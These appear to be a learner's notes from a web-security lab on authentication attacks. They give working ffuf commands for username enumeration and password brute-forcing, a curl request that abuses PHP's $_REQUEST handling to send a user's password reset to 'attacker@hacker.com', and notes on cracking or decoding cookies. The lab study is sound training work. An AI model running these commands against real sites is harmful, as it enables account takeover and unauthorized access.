**username enum**
if the application gives information on existence: "this account already exists"
you can brute force with a list and see which usernames you get
`ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.91.163/customers/signup -mr "username already exists"
the `-mr` argument is the text on the page we are looking for to validate we've found a valid username.

**bruteforcing passwords, after fiding valid usernames**
`ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.91.163/customers/login -fc 200`

**logical flaw**
Sometimes authentication processes contain logic flaws. A logic flaw is when the typical logical path of an application is either bypassed, circumvented or manipulated by a hacker. Logic flaws can exist in any area of a website.

exploiting the get/post params as interpreted by $\_REQUEST in php
`curl 'http://10.10.91.163/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'`
in the above the ?email gets ovewritten by the -d email= since the last one is POST

**cookie tampering**
Examining and editing the cookies set by the web server during your online session can have multiple outcomes, such as unauthenticated access, access to another user's account, or elevated privileges.

Sometimes cookie values can look like a long string of random characters; these are called hashes which are an irreversible representation of the original text.
md5, sha256/512, sha1
Even though the hash is irreversible, the same output is produced every time, which is helpful for us as services such as [https://crackstation.net/](https://crackstation.net/) keep databases of billions of hashes and their original strings.
Encoding is similar to hashing in that it creates what would seem to be a random string of text, but in fact, the encoding is reversible.
Encoding allows us to convert binary data into human-readable text that can be easily and safely transmitted over mediums that only support plain text ASCII characters.